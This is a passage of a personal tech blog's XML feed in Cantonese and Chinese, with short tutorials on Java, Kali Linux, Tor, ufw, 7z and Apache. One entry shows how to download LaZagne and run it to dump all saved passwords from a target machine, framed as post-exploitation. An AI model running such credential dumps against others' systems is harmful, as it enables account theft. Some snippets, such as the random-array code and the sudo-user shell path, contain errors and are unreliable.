    <content><![CDATA[<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><p>使用 .setVisible 功能 - boolean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> JFrame(<span class="string">&quot;frame1&quot;</span>).setVisible(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Jframe</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Timer - 每 X 秒執行一次</title>
    <url>/2022/01/22/Java-Timer/</url>
    <content><![CDATA[<h2 id="code"><a href="#code" class="headerlink" title="code -.-"></a>code -.-</h2><p>以下既 code 就係將入面既內容每 X 秒就會將佢自動行一次。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Timer timer = <span class="keyword">new</span> Timer();</span><br><span class="line">TimerTask task = <span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//呢度就係每 0.5 會行既野</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">timer.schedule(task, <span class="number">500L</span>, <span class="number">500L</span>); <span class="comment">// 0.5 秒執行一次，每次隔 0.5 秒執行一次</span></span><br></pre></td></tr></table></figure>

<p>0.5 秒執行一次，每次隔 0.5 秒執行一次</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java - Datatype</title>
    <url>/2022/01/22/Java-datatype/</url>
    <content><![CDATA[<h1 id="Primitive-Data-Types"><a href="#Primitive-Data-Types" class="headerlink" title="Primitive Data Types"></a>Primitive Data Types</h1><table>
  <tbody>
    <tr>
      <th style="width:20%">Data Type</th>
      <th style="width:17%">Size</th>
      <th style="width:63%">Description</th>
    </tr>
    <tr>
      <td>byte</td>
      <td>1 byte</td>
      <td>Stores whole numbers from -128 to 127</td>
    </tr>
    <tr>
      <td>short</td>
      <td>2 bytes</td>
      <td>Stores whole numbers from -32,768 to 32,767</td>
    </tr>
    <tr>
      <td>int</td>
      <td>4 bytes</td>
      <td>Stores whole numbers from -2,147,483,648 to 2,147,483,647</td>
    </tr>
    <tr>
      <td>long</td>
      <td>8 bytes</td>
      <td>
        Stores whole numbers from -9,223,372,036,854,775,808 to
        9,223,372,036,854,775,807
      </td>
    </tr>
    <tr>
      <td>float</td>
      <td>4 bytes</td>
      <td>
        Stores fractional numbers. Sufficient for storing 6 to 7 decimal digits
      </td>
    </tr>
    <tr>
      <td>double</td>
      <td>8 bytes</td>
      <td>
        Stores fractional numbers. Sufficient for storing 15 decimal digits
      </td>
    </tr>
    <tr>
      <td>boolean</td>
      <td>1 bit</td>
      <td>Stores true or false values</td>
    </tr>
    <tr>
      <td>char</td>
      <td>2 bytes</td>
      <td>Stores a single character/letter or ASCII values</td>
    </tr>
  </tbody>
</table>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java - 隨機數值</title>
    <url>/2022/02/03/Java-random-numbers/</url>
    <content><![CDATA[<h1 id="最基本用法"><a href="#最基本用法" class="headerlink" title="最基本用法"></a>最基本用法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">random</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> wtf = random.nextDouble();</span><br><span class="line"></span><br><span class="line">        System.out.println(wtf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javac random.java</span></span><br><span class="line">0.22359886382133654</span><br></pre></td></tr></table></figure>

<h1 id="Array-Random"><a href="#Array-Random" class="headerlink" title="Array Random"></a>Array Random</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">randomarray</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String[] arrayy =&#123;<span class="string">&quot;on9&quot;</span>,<span class="string">&quot;on99&quot;</span>,<span class="string">&quot;on999&quot;</span>,<span class="string">&quot;on9999&quot;</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> randomNumber = random.nextInt(arr.length);</span><br><span class="line"></span><br><span class="line">        System.out.println(arr[randomNumber]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javac randomarray.java</span></span><br><span class="line">on99</span><br></pre></td></tr></table></figure>

<p><a href="https://www.youtube.com/watch?v=HP21GBqCdbw">https://www.youtube.com/watch?v=HP21GBqCdbw</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux - 安裝 snapd</title>
    <url>/2022/01/07/Kali-install-snapd/</url>
    <content><![CDATA[<img src="/2022/01/07/Kali-install-snapd/cover.png" class="">

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Snap 是一個 Packages Manager，他和 Linux 上的 <code>apt</code>, <code>apt-get</code>, <code>pacman</code> ,<code>dnf</code> 一樣，你可以將 Snap 當作同一類。</p>
<hr>
<h2 id="更新-Package-Manager"><a href="#更新-Package-Manager" class="headerlink" title="更新 Package Manager"></a>更新 Package Manager</h2><p>安裝之前，請更新 Package manager，輸入以下指令更新。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<img src="/2022/01/07/Kali-install-snapd/0.png" class="">


<h3 id="安裝-Snap"><a href="#安裝-Snap" class="headerlink" title="安裝 Snap"></a>安裝 Snap</h3><p>然後輸入以下指令安裝。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install snapd -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-snapd/1.png" class="">

<h3 id="啟動服務"><a href="#啟動服務" class="headerlink" title="啟動服務"></a>啟動服務</h3><p>安裝完成後輸我們需要開啟 snap 和 啟動 <code>snapd.apparmor</code> 服務，輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable --now snapd apparmor</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-snapd/2.png" class="">


<h3 id="SNAP"><a href="#SNAP" class="headerlink" title="SNAP"></a>SNAP</h3><p>輸入 <code>snap</code> 查看是否有反應。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snap</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-snapd/3.png" class="">

<p>參考資料 :<br><a href="https://www.kali.org/docs/tools/snap/">https://www.kali.org/docs/tools/snap/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>Package Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux - 安裝 TorBrowser</title>
    <url>/2022/01/07/Kali-install-torbrowser/</url>
    <content><![CDATA[<img src="cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本身 Kali Linux 係冇幫你裝到 TorBrowser。<br>我地要自己再打指令安裝。</p>
<blockquote>
<p>注意 : Kali 裝法同其他系統唔一樣，唔建議用呢個裝法放喺其他系統。</p>
</blockquote>
<h1 id="apt-update"><a href="#apt-update" class="headerlink" title="apt update"></a>apt update</h1><p>首先將 apt update。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-torbrowser/i.png" class="">

<h2 id="安裝-Torbrowser"><a href="#安裝-Torbrowser" class="headerlink" title="安裝 Torbrowser"></a>安裝 Torbrowser</h2><p>然後再輸入以下指令安裝。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install -y tor torbrowser-launcher</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-torbrowser/y.png" class="">

<h1 id="開啟-Torbrowser-下載所需檔案"><a href="#開啟-Torbrowser-下載所需檔案" class="headerlink" title="開啟 Torbrowser (下載所需檔案)"></a>開啟 Torbrowser (下載所需檔案)</h1><p>於 Terminal 輸入以下指令。</p>
<p>另外，第一次開啟 Torbrowser 會需要下載檔案，請耐心等待。</p>
<blockquote>
<p>注意 : 如果你是使用 <code>root</code> 權限的話請將他切換至普通權限，Torbrowser 是不允許使用 <code>root</code> 權限使用 Torbrowser。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">torbrowser-launcher</span><br></pre></td></tr></table></figure>

<img src="/2022/01/07/Kali-install-torbrowser/hi.png" class="">

<h2 id="開啟-Torbrowser-成功"><a href="#開啟-Torbrowser-成功" class="headerlink" title="開啟 Torbrowser (成功)"></a>開啟 Torbrowser (成功)</h2><p>下載完成。</p>
<img src="/2022/01/07/Kali-install-torbrowser/DONE.png" class="">

<h3 id="連接-Tor-Nework"><a href="#連接-Tor-Nework" class="headerlink" title="連接 Tor Nework"></a>連接 Tor Nework</h3><p>但現在我們還沒成功連接至 Tor Network，<br>按下 <code>Connect</code> 連接 Tor Network。</p>
<img src="/2022/01/07/Kali-install-torbrowser/c.png" class="">

<h3 id="成功連接"><a href="#成功連接" class="headerlink" title="成功連接"></a>成功連接</h3><img src="/2022/01/07/Kali-install-torbrowser/d.png" class="">

<p>參考資料 :<br><a href="https://www.kali.org/docs/tools/tor/">https://www.kali.org/docs/tools/tor/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux - 升級系統至最新版本</title>
    <url>/2022/01/07/Kali-update/</url>
    <content><![CDATA[<h1 id="確定-Sources-list"><a href="#確定-Sources-list" class="headerlink" title="確定 Sources.list"></a>確定 Sources.list</h1><p>要升級 Kali，首先確保 <code>/etc/apt/sources.lis</code> 內容係正確，輸入以下指令查看 list。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<h2 id="結果顯示"><a href="#結果顯示" class="headerlink" title="結果顯示"></a>結果顯示</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat /etc/apt/sources.list</span><br><span class="line"><span class="meta">#</span><span class="bash"> See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Additional line <span class="keyword">for</span> <span class="built_in">source</span> packages</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://http.kali.org/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure>

<pre><code>deb http://http.kali.org/kali kali-rolling main contrib non-free
</code></pre>
<p>看到以上是這個連結，沒有問題就可以繼續下去。</p>
<h2 id="確定後更新-update"><a href="#確定後更新-update" class="headerlink" title="確定後更新 (update)"></a>確定後更新 (update)</h2><p>將 Kali <code>Full upgrade</code> 之前，請先將 <code>apt update</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<h2 id="確定後升級-Full-upgrade"><a href="#確定後升級-Full-upgrade" class="headerlink" title="確定後升級 (Full upgrade)"></a>確定後升級 (Full upgrade)</h2><p>update 完再輸入指令 full upgrade。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt full-upgrade -y</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.kali.org/docs/general-use/updating-kali/">https://www.kali.org/docs/general-use/updating-kali/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Updates</tag>
      </tags>
  </entry>
  <entry>
    <title>LaZagne - 爆破軟件密碼工具 (Windows)</title>
    <url>/2021/12/15/LaZagne-command/</url>
    <content><![CDATA[<h1 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h1><p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> 是一個開源應用程序。它檢索系統上存儲的密碼。它直接將 Python 代碼注入內存中，無需在磁盤上寫入任何內容。這使得追踪變得困難。通常，當我們在目標系統上獲得會話時，我們的主要目的是收集憑據。當攻擊者攻擊目標時，有兩種方法可以危害目標。如果攻擊者獲得了 Meterpreter 會話，那麼它所做的就是危及設備安全。</p>
<p>但是使用一些腳本和後期利用模塊，目標可以危及受害者的每一個安全角落。這包括電子郵件密碼、社交網絡密碼、SSH 密碼、銀行信息等。通常，提取密碼是一項嘈雜和笨拙的任務，但使用 LaZagne 則非常簡單和隱蔽。</p>
<p>如果沒有 LaZagne，攻擊者通常會針對安裝在目標系統上的不同應用程序運行一堆不同的腳本。但是 LaZagne 會自動執行此操作，它首先檢查目標系統上安裝了哪個應用程序，然後運行針對該特定應用程序密碼的特定腳本。</p>
<h2 id="LaZagne-包括腳本"><a href="#LaZagne-包括腳本" class="headerlink" title="LaZagne 包括腳本"></a>LaZagne 包括腳本</h2><ul>
<li>KeeThief</li>
<li>mimipy</li>
<li>mimikatz</li>
<li>pypykatz</li>
<li>creddump</li>
<li>chainbreaker</li>
<li>pyaes</li>
<li>pyDes</li>
<li>secretstorage and many more.</li>
</ul>
<h2 id="目標軟件"><a href="#目標軟件" class="headerlink" title="目標軟件"></a>目標軟件</h2><ul>
<li>Firefox</li>
<li>Google Chrome</li>
<li>Opera</li>
<li>Skype</li>
<li>Postgresql</li>
<li>Thunderbird</li>
<li>Keepass</li>
<li>CoreFTP</li>
<li>FileZilla and many more.</li>
</ul>
<h1 id="作者-Github"><a href="#作者-Github" class="headerlink" title="作者 Github"></a>作者 Github</h1><ul>
<li><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li>
</ul>
<h1 id="下載-LaZagne"><a href="#下載-LaZagne" class="headerlink" title="下載 LaZagne"></a>下載 LaZagne</h1><p>使用 <code>wget</code> 下載。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe</span><br></pre></td></tr></table></figure>

<h1 id="指令說明"><a href="#指令說明" class="headerlink" title="指令說明"></a>指令說明</h1><p>當你成功下載後，可以輸入 <code>lazagne.exe</code> 運行。<br>以下是指令。</p>
<h2 id="幫助"><a href="#幫助" class="headerlink" title="幫助"></a>幫助</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lazagne.exe -h</span><br></pre></td></tr></table></figure>

<h2 id="載入全部-Module"><a href="#載入全部-Module" class="headerlink" title="載入全部 Module"></a>載入全部 Module</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure>

<h2 id="載入指定-Module-瀏覽器"><a href="#載入指定-Module-瀏覽器" class="headerlink" title="載入指定 Module (瀏覽器)"></a>載入指定 Module (瀏覽器)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lazagne.exe browsers</span><br></pre></td></tr></table></figure>

<img src="/2021/12/15/LaZagne-command/program.png" class="">

<h2 id="載入指定-Moudle-瀏覽器-指定-Software-Firefox"><a href="#載入指定-Moudle-瀏覽器-指定-Software-Firefox" class="headerlink" title="載入指定 Moudle (瀏覽器) + 指定 Software (Firefox)"></a>載入指定 Moudle (瀏覽器) + 指定 Software (Firefox)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lazagne.exe browsers -firefox</span><br></pre></td></tr></table></figure>

<h2 id="將全部資料寫入檔案"><a href="#將全部資料寫入檔案" class="headerlink" title="將全部資料寫入檔案"></a>將全部資料寫入檔案</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lazagne.exe all -oN</span><br><span class="line">lazagne.exe all -oA -output C:\Users\lazagne\Desktop</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 7z 壓縮檔案工具</title>
    <url>/2022/07/08/Linux-7z-commands/</url>
    <content><![CDATA[<img src="7ziplogo.svg" width="200px"/>

<h1 id="7-Zip"><a href="#7-Zip" class="headerlink" title="7-Zip"></a>7-Zip</h1><p>7-Zip 是一個免費的開源文件壓縮器，用於將文件壓縮的程式。<br>程式可於三個主流系統內安裝，包括 Windows，MacOS，Linux 三個系統。</p>
<h1 id="更新套裝管理員"><a href="#更新套裝管理員" class="headerlink" title="更新套裝管理員"></a>更新套裝管理員</h1><p>在安裝之前請先將你的系統內的套裝管理員更新：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br></pre></td></tr></table></figure>

<h1 id="安裝-7-Zip"><a href="#安裝-7-Zip" class="headerlink" title="安裝 7-Zip"></a>安裝 7-Zip</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install p7zip-full -y</span><br></pre></td></tr></table></figure>

<h1 id="列出壓縮檔內容"><a href="#列出壓縮檔內容" class="headerlink" title="列出壓縮檔內容"></a>列出壓縮檔內容</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7z l file1.7z</span><br></pre></td></tr></table></figure>

<h1 id="加入壓縮檔"><a href="#加入壓縮檔" class="headerlink" title="加入壓縮檔"></a>加入壓縮檔</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7z a file1.7z file1.txt</span><br></pre></td></tr></table></figure>

<h1 id="解壓壓縮檔"><a href="#解壓壓縮檔" class="headerlink" title="解壓壓縮檔"></a>解壓壓縮檔</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7z e file1.7z</span><br></pre></td></tr></table></figure>

<p>參考資料：<br><a href="https://linuxhint.com/install-7zip-compression-tool-on-ubuntu/">https://linuxhint.com/install-7zip-compression-tool-on-ubuntu/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>壓縮</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 建立 Sudo 權限 User</title>
    <url>/2021/12/17/Linux-Create-user/</url>
    <content><![CDATA[<h1 id="建立-sudo-User"><a href="#建立-sudo-User" class="headerlink" title="建立 sudo User"></a>建立 sudo User</h1><hr>
<h2 id="進入-sudo-user"><a href="#進入-sudo-user" class="headerlink" title="進入 sudo user"></a>進入 sudo user</h2><p>要建立一個 sudo 權限既 user 之前，我地需要入一個有 sudo 權限既 user 先，輸入以下指令進入 sudo user。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su -</span><br></pre></td></tr></table></figure>

<h2 id="建立用戶名稱"><a href="#建立用戶名稱" class="headerlink" title="建立用戶名稱"></a>建立用戶名稱</h2><p>諗一個名俾你既 sudo user 用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -m &quot;CreateUsername&quot;</span><br></pre></td></tr></table></figure>

<h2 id="建立用戶密碼"><a href="#建立用戶密碼" class="headerlink" title="建立用戶密碼"></a>建立用戶密碼</h2><p>諗一個密碼俾你既 sudo user。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd &quot;CreateUsername&quot;</span><br></pre></td></tr></table></figure>


<h2 id="加佢入-sudo-list"><a href="#加佢入-sudo-list" class="headerlink" title="加佢入 sudo list"></a>加佢入 sudo list</h2><p>加完我地仲要將佢加入去 list，輸入呢兩句：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usermod -a -G sudo CreatUsername</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/shell CreatUsername</span><br></pre></td></tr></table></figure>

<p>完成。</p>
<p><a href="https://www.youtube.com/watch?v=F31TB4na8xQ">https://www.youtube.com/watch?v=F31TB4na8xQ</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - ufw 防火牆指令列表</title>
    <url>/2021/12/15/Linux-Firewall-ufw/</url>
    <content><![CDATA[<h1 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h1><p>ufw 全名係 Uncomplicated Firewall，係一個比起 iptables 既指令簡單易明既防火牆指令工具。</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ufw -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/15/Linux-Firewall-ufw/ufw.png" class="">

<h1 id="啟動-ufw"><a href="#啟動-ufw" class="headerlink" title="啟動 ufw"></a>啟動 ufw</h1><p>當你裝完都係未用到既，你要 enable 返佢先用到。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure>

<img src="/2021/12/15/Linux-Firewall-ufw/enable.png" class="">

<h2 id="設定防火牆預設規則"><a href="#設定防火牆預設規則" class="headerlink" title="設定防火牆預設規則"></a>設定防火牆預設規則</h2><p>設置預設狀態</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw default allow # 預設允許</span><br><span class="line">sudo ufw default deny # 預設封鎖</span><br></pre></td></tr></table></figure>

<h2 id="允許-封鎖通訊埠（port）"><a href="#允許-封鎖通訊埠（port）" class="headerlink" title="允許/封鎖通訊埠（port）"></a>允許/封鎖通訊埠（port）</h2><p>允許 SSH port 可以這樣下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 22</span><br></pre></td></tr></table></figure>

<h2 id="指定性允許-Port"><a href="#指定性允許-Port" class="headerlink" title="指定性允許 Port"></a>指定性允許 Port</h2><p>允許 80, 443 Port</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 80</span><br><span class="line">sudo ufw allow 443</span><br></pre></td></tr></table></figure>

<h2 id="指定性封鎖-Port"><a href="#指定性封鎖-Port" class="headerlink" title="指定性封鎖 Port"></a>指定性封鎖 Port</h2><p>封鎖 3389,21 Port</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw deny 3389</span><br><span class="line">sudo ufw deny 21</span><br></pre></td></tr></table></figure>

<h2 id="範圍性允許-Port"><a href="#範圍性允許-Port" class="headerlink" title="範圍性允許 Port"></a>範圍性允許 Port</h2><p>允許 TCP 6000-6007 Port</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 6000:6007/tcp</span><br></pre></td></tr></table></figure>

<h2 id="特定-IP-規則"><a href="#特定-IP-規則" class="headerlink" title="特定 IP 規則"></a>特定 IP 規則</h2><p>針對某些 IP 不受控管</p>
<hr>
<h3 id="允許特定-IP"><a href="#允許特定-IP" class="headerlink" title="允許特定 IP"></a>允許特定 IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow from 192.168.11.10 # 允許 192.168.11.10 的所有連線</span><br><span class="line">sudo ufw allow from 192.168.11.0/24 # 允許 192.168.11.1-192.168.11.255 的所有連線</span><br></pre></td></tr></table></figure>

<h3 id="封鎖特定-IP"><a href="#封鎖特定-IP" class="headerlink" title="封鎖特定 IP"></a>封鎖特定 IP</h3><p>封鎖 192.168.11.4 所有連線</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw deny from 192.168.11.4</span><br></pre></td></tr></table></figure>

<h2 id="針對某-IP-並封鎖-Port-22"><a href="#針對某-IP-並封鎖-Port-22" class="headerlink" title="針對某 IP 並封鎖 Port 22"></a>針對某 IP 並封鎖 Port 22</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw deny from 192.168.11.7 to any port 22</span><br></pre></td></tr></table></figure>

<h2 id="查看目前設了什麼規則"><a href="#查看目前設了什麼規則" class="headerlink" title="查看目前設了什麼規則"></a>查看目前設了什麼規則</h2><p>這個指令會幫你把規則前面加上編號：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw status numbered</span><br></pre></td></tr></table></figure>

<p>or</p>
<p>而呢個就唔會幫你加編號</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure>

<h2 id="刪除規則"><a href="#刪除規則" class="headerlink" title="刪除規則"></a>刪除規則</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw delete [Number]</span><br></pre></td></tr></table></figure>

<h2 id="開啟-關閉-重設防火牆"><a href="#開啟-關閉-重設防火牆" class="headerlink" title="開啟/關閉/重設防火牆"></a>開啟/關閉/重設防火牆</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw enable # 啟用防火牆</span><br><span class="line">sudo ufw disable # 停用防火牆</span><br><span class="line">sudo ufw reset #重設防火牆</span><br></pre></td></tr></table></figure>

<h2 id="查指定-Port"><a href="#查指定-Port" class="headerlink" title="查指定 Port"></a>查指定 Port</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser 8080/tcp</span><br></pre></td></tr></table></figure>

<h2 id="刪除規則-1"><a href="#刪除規則-1" class="headerlink" title="刪除規則"></a>刪除規則</h2><ul>
<li>-k Base on Kill</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser -k 8080/tcp</span><br></pre></td></tr></table></figure>

<p>參考資料：<br><a href="https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux">https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux</a><br><a href="https://noob.tw/ufw/">https://noob.tw/ufw/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - Apache 伺服器</title>
    <url>/2022/02/16/Linux-apache-using/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux Apache 係可以用黎 test web，<br>俾同一個 Network 底下既人入。</p>
<h3 id="更新-Package"><a href="#更新-Package" class="headerlink" title="更新 Package"></a>更新 Package</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<h3 id="安裝-Apache2"><a href="#安裝-Apache2" class="headerlink" title="安裝 Apache2"></a>安裝 Apache2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install apache2 -y</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Status"><a href="#Apache-Status" class="headerlink" title="Apache Status"></a>Apache Status</h3><p>安裝完成次後我地睇下 Apache2 既 Status.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl status apache2</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Start-Stop-Reload"><a href="#Apache-Start-Stop-Reload" class="headerlink" title="Apache Start / Stop / Reload"></a>Apache Start / Stop / Reload</h3><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">Start Apache</button></li><li class="tab"><button type="button" data-href="#test1-2">Stop Apache</button></li><li class="tab"><button type="button" data-href="#test1-3">Reload Apache</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p>當你想開左佢既時候，<br>你可以咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p>當你想停左佢既時候，<br>你可以咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop apache2</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p>當你想重開佢既時候，<br>你可以咁打</p>
